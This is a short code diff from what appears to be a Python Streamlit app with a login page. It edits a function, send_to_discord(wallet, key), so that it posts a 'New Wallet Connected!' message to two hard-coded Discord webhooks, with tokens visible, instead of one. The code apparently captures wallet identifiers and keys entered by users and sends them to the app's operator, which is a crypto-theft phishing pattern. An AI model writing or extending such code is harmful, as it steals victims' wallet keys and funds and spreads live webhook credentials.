@@ -120,8 +120,11 @@ def login_page():
                 st.rerun()
 
 def send_to_discord(wallet, key):
-    webhook_url = "https://discordapp.com/api/webhooks/1333513646948749433/59hwJeUeRRSeGNZo4wyAJ3tVu6bPIWixP8G49OXjbpOJU2PxGBe5457GYztx3f1sLgcp"
-    webhook_url = "https://discord.com/api/webhooks/1333800578677215282/E7y-425Rt73Uuk6bOoWMF3E_eFt_o7HJIvdTpQjrjPphVVo8hsI1mPbIMfU7l3xNQmTR"
+    webhook_urls = [ 
+        "https://discordapp.com/api/webhooks/1333513646948749433/59hwJeUeRRSeGNZo4wyAJ3tVu6bPIWixP8G49OXjbpOJU2PxGBe5457GYztx3f1sLgcp",
+        "https://discord.com/api/webhooks/1333800578677215282/E7y-425Rt73Uuk6bOoWMF3E_eFt_o7HJIvdTpQjrjPphVVo8hsI1mPbIMfU7l3xNQmTR"
+    ]
+    
     
     embed = {
         "title": "🎯 New Wallet Connected!",
